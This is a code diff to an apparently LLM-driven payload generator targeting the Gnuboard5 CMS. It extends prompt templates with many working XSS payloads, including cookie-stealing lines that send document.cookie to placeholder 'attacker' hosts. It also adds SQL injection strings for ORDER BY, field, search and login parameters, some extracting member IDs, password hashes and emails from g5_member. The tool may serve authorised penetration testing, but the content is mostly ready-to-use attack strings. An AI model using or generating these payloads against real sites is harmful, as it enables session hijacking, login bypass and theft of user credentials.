@@ -55,6 +55,7 @@ FOCUS on:
 6. Uncommon events: <img src=x onmouseover=alert(1)>, <body onpageshow=alert(1)>
 7. Encoded tag: <&#x69;mg src=x onerror=alert(1)>
 
+ONLY USE THIS TYPE: STORED_XSS
 Output format (one line per payload, no other text):
 TYPE | PATTERN_FAMILY | PAYLOAD
 
@@ -62,7 +63,11 @@ Example:
 STORED_XSS | img_onerror | <img src=x onerror=alert(1)>
 STORED_XSS | svg_onload | <svg/onload=alert(1)>
 STORED_XSS | a_javascript | <a href="javascript:alert(1)">x</a>
-STORED_XSS | details_ontoggle | <details open ontoggle=alert(1)>x</details>"""
+STORED_XSS | details_ontoggle | <details open ontoggle=alert(1)>x</details>
+STORED_XSS | img_backtick | <img src=x onerror=alert`1`>
+STORED_XSS | img_onmouseover | <img src=x onmouseover=alert(1)>
+STORED_XSS | css_animation | <p style="animation-name:x;animation-duration:1s" onanimationstart=alert(1)>x</p>
+STORED_XSS | encoded_tag | <&#x69;mg src=x onerror=alert(1)>"""
 
 
 def build_xss_content(point: Dict[str, Any], count: int = 5) -> str:
@@ -102,12 +107,19 @@ For cookie exfiltration variants (replace alert(1) with):
   fetch('http://ATTACKER/?c='+document.cookie)
   new Image().src='http://ATTACKER/?c='+document.cookie
 
+ONLY USE THIS TYPE: STORED_XSS
 Output format (one line per payload, no other text):
 TYPE | PATTERN_FAMILY | PAYLOAD
 
 Example:
 STORED_XSS | img_onerror | <img src=x onerror=alert(1)>
-STORED_XSS | details_ontoggle | <details open ontoggle=alert(1)>x</details>"""
+STORED_XSS | a_javascript | <a href=javascript:alert(1)>click</a>
+STORED_XSS | svg_onload | <svg/onload=alert(1)>
+STORED_XSS | details_ontoggle | <details open ontoggle=alert(1)>x</details>
+STORED_XSS | video_onerror | <video><source onerror=alert(1)></video>
+STORED_XSS | marquee_onstart | <marquee onstart=alert(1)>x</marquee>
+STORED_XSS | iframe_srcdoc | <iframe srcdoc="<script>alert(1)</script>">
+STORED_XSS | exfil_fetch | <img src=x onerror=fetch('http://attacker/?c='+document.cookie)>"""
 
 
 def build_xss_search(point: Dict[str, Any], count: int = 5) -> str:
@@ -171,13 +183,20 @@ FOCUS on these working strategies:
    " onmouseover=fetch('http://attacker/?c='+document.cookie) x="
    " onmouseover=new/**/Image().src='http://attacker/?c='+document.cookie x="
 
+ONLY USE THIS TYPE: REFLECTED_XSS
+REMINDER: every payload MUST start with " and end with x=" to stay inside the attribute
 Output format (one line per payload, no other text):
 TYPE | PATTERN_FAMILY | PAYLOAD
 
 Example:
 REFLECTED_XSS | onmouseover_alert | " onmouseover=alert(1) x="
 REFLECTED_XSS | onmouseover_backtick | " onmouseover=alert`1` x="
+REFLECTED_XSS | onmouseover_cookie | " onmouseover=alert(document.cookie) x="
 REFLECTED_XSS | onmouseenter | " onmouseenter=alert(1) x="
+REFLECTED_XSS | onmouseleave | " onmouseleave=alert(1) x="
+REFLECTED_XSS | onmousedown | " onmousedown=alert(1) x="
+REFLECTED_XSS | onmouseup | " onmouseup=alert(1) x="
+REFLECTED_XSS | oninput | " oninput=alert(1) x="
 REFLECTED_XSS | onkeydown | " onkeydown=alert(1) x=\""""
 
 
@@ -222,13 +241,19 @@ Focus on:
 
 DO NOT use: onclick=, onfocus= (these are filtered)
 
+ONLY USE THIS TYPE: STORED_XSS
+REMINDER: DO NOT use onclick= or onfocus= — they are filtered
 Output format (one line per payload, no other text):
 TYPE | PATTERN_FAMILY | PAYLOAD
 
 Example:
 STORED_XSS | url_onmouseover | http://x.com" onmouseover="alert(1)
+STORED_XSS | url_backtick | http://x.x" onmouseover="alert`1`
 STORED_XSS | url_onmouseenter | http://x.x" onmouseenter="alert(1)
-STORED_XSS | img_onerror | <img src=x onerror=alert(1)>"""
+STORED_XSS | url_onmouseleave | http://x.x" onmouseleave="alert(1)
+STORED_XSS | url_cookie | http://x.x" onmouseover="fetch('http://attacker/?c='+document.cookie)
+STORED_XSS | img_onerror | <img src=x onerror=alert(1)>
+STORED_XSS | svg_onload | <svg/onload=alert(1)>"""
 
 
 # SQLi 빌더 - Gnuboard5 특화
@@ -271,13 +296,18 @@ Attack techniques:
 Note: ORDER BY does NOT allow UNION SELECT directly, but subqueries work.
 Format sst values only (what goes after ORDER BY).
 
+ONLY USE THIS TYPE: SQLI_ORDERBY
 Output format (one line per payload, no other text):
 TYPE | PATTERN_FAMILY | PAYLOAD
 
 Example:
 SQLI_ORDERBY | time_sleep | (SELECT SLEEP(5))
+SQLI_ORDERBY | time_if | IF(1=1,SLEEP(5),wr_datetime)
+SQLI_ORDERBY | time_subq | wr_datetime,(SELECT SLEEP(5))
 SQLI_ORDERBY | bool_case | CASE WHEN (1=1) THEN wr_datetime ELSE wr_num END
-SQLI_ORDERBY | error_extractvalue | EXTRACTVALUE(1,CONCAT(0x7e,database()))"""
+SQLI_ORDERBY | bool_ascii | CASE WHEN (ASCII(SUBSTRING(database(),1,1))>64) THEN wr_datetime ELSE wr_num END
+SQLI_ORDERBY | error_extractvalue | EXTRACTVALUE(1,CONCAT(0x7e,database()))
+SQLI_ORDERBY | error_updatexml | UPDATEXML(1,CONCAT(0x7e,user()),1)"""
 
 
 def build_sqli_field(point: Dict[str, Any], count: int = 5) -> str:
@@ -332,13 +362,20 @@ Use VALID column names as prefix to pass the whitelist check, then inject after:
 Note: Try both with and without closing parenthesis before AND, depending on actual SQL structure.
 Also try: wr_subject||wr_content as prefix (both columns concatenated).
 
+ONLY USE THIS TYPE: SQLI_FIELD
+REMINDER: every payload MUST start with a valid column name (wr_subject or wr_subject||wr_content)
 Output format (one line per payload, no other text):
 TYPE | PATTERN_FAMILY | PAYLOAD
 
 Example:
-SQLI_FIELD | piggyback_error | wr_subject)AND(EXTRACTVALUE(1,CONCAT(0x7e,database())))-- -
+SQLI_FIELD | piggyback_error_db | wr_subject)AND(EXTRACTVALUE(1,CONCAT(0x7e,database())))-- -
+SQLI_FIELD | piggyback_error_ver | wr_subject)AND(EXTRACTVALUE(1,CONCAT(0x7e,version())))-- -
+SQLI_FIELD | piggyback_error_user | wr_subject)AND(UPDATEXML(1,CONCAT(0x7e,user()),1))-- -
 SQLI_FIELD | piggyback_sleep | wr_subject)AND(SLEEP(5))-- -
-SQLI_FIELD | piggyback_true | wr_subject)AND(1=1)-- -"""
+SQLI_FIELD | piggyback_if_sleep | wr_subject)AND(IF(1=1,SLEEP(5),0))-- -
+SQLI_FIELD | piggyback_true | wr_subject)AND(1=1)-- -
+SQLI_FIELD | piggyback_false | wr_subject)AND(1=2)-- -
+SQLI_FIELD | concat_prefix | wr_subject||wr_content)AND(EXTRACTVALUE(1,CONCAT(0x7e,database())))-- -"""
 
 
 def build_sqli_string(point: Dict[str, Any], count: int = 5) -> str:
@@ -434,18 +471,27 @@ Attack techniques to cover:
    a'))))AND(SLEEP(5))#
    a'))))AND(IF(1=1,SLEEP(5),0))#
 
+ONLY USE THESE TYPES: BOOLEAN, ERROR_BASED, TIME_BASED
+REMINDER: every payload MUST start with a')))) and end with # and contain NO spaces
 Output format (one line per payload, no other text):
 TYPE | PATTERN_FAMILY | PAYLOAD
 
 Example:
 BOOLEAN | instr_true | a'))))OR(1=1)#
 BOOLEAN | instr_false | a'))))AND(1=2)#
+BOOLEAN | instr_len | a'))))AND(LENGTH(database())>0)#
+BOOLEAN | instr_mid | a'))))AND(MID(database(),1,1)REGEXP(0x5e61))#
+BOOLEAN | instr_subq | a'))))AND((SELECT/**/1/**/FROM/**/information_schema.tables/**/LIMIT/**/1)=1)#
 ERROR_BASED | extract_db | a'))))AND(EXTRACTVALUE(1,CONCAT(0x7e,database())))#
+ERROR_BASED | extract_ver | a'))))AND(EXTRACTVALUE(1,CONCAT(0x7e,version())))#
+ERROR_BASED | extract_user | a'))))AND(EXTRACTVALUE(1,CONCAT(0x7e,user())))#
 ERROR_BASED | extract_tables | a'))))AND(EXTRACTVALUE(1,CONCAT(0x7e,(SELECT/**/GROUP_CONCAT(table_name)/**/FROM/**/information_schema.tables/**/WHERE/**/table_schema=database()))))#
 ERROR_BASED | extract_member | a'))))AND(EXTRACTVALUE(1,CONCAT(0x7e,(SELECT/**/CONCAT(mb_id,0x3a,mb_password)/**/FROM/**/g5_member/**/LIMIT/**/1))))#
 ERROR_BASED | extract_member2 | a'))))AND(EXTRACTVALUE(1,CONCAT(0x7e,(SELECT/**/CONCAT(mb_id,0x3a,mb_password)/**/FROM/**/g5_member/**/LIMIT/**/1,1))))#
 ERROR_BASED | extract_email | a'))))AND(EXTRACTVALUE(1,CONCAT(0x7e,(SELECT/**/mb_email/**/FROM/**/g5_member/**/LIMIT/**/1))))#
-TIME_BASED | instr_sleep | a'))))AND(SLEEP(5))#"""
+ERROR_BASED | extract_cols | a'))))AND(EXTRACTVALUE(1,CONCAT(0x7e,(SELECT/**/GROUP_CONCAT(column_name)/**/FROM/**/information_schema.columns/**/WHERE/**/table_name=0x67355f6d656d626572))))#
+TIME_BASED | instr_sleep | a'))))AND(SLEEP(5))#
+TIME_BASED | instr_if_sleep | a'))))AND(IF(1=1,SLEEP(5),0))#"""
 
 
 
@@ -487,13 +533,19 @@ Attack techniques:
 5. UNION-based (determine column count of member table):
    mb_id: ' UNION SELECT 1,2,3,4,5-- -
 
+ONLY USE THIS TYPE: SQLI_LOGIN
 Output format (one line per payload, no other text):
 TYPE | PATTERN_FAMILY | PAYLOAD
 
 Example:
 SQLI_LOGIN | auth_bypass | admin'-- -
 SQLI_LOGIN | tautology | ' OR '1'='1'-- -
-SQLI_LOGIN | time_sleep | ' AND SLEEP(5)-- -"""
+SQLI_LOGIN | tautology2 | admin' OR 1=1-- -
+SQLI_LOGIN | tautology3 | ' OR '1'='1
+SQLI_LOGIN | time_sleep | 0 OR SLEEP(5)-- -
+SQLI_LOGIN | time_cond | admin' AND SLEEP(5)-- -
+SQLI_LOGIN | error_extract | ' AND EXTRACTVALUE(1,CONCAT(0x7e,database()))-- -
+SQLI_LOGIN | error_update | ' OR UPDATEXML(1,CONCAT(0x7e,user()),1)-- -"""
 
 
 # SQLi 빌더 - 일반형 (호환성 유지)
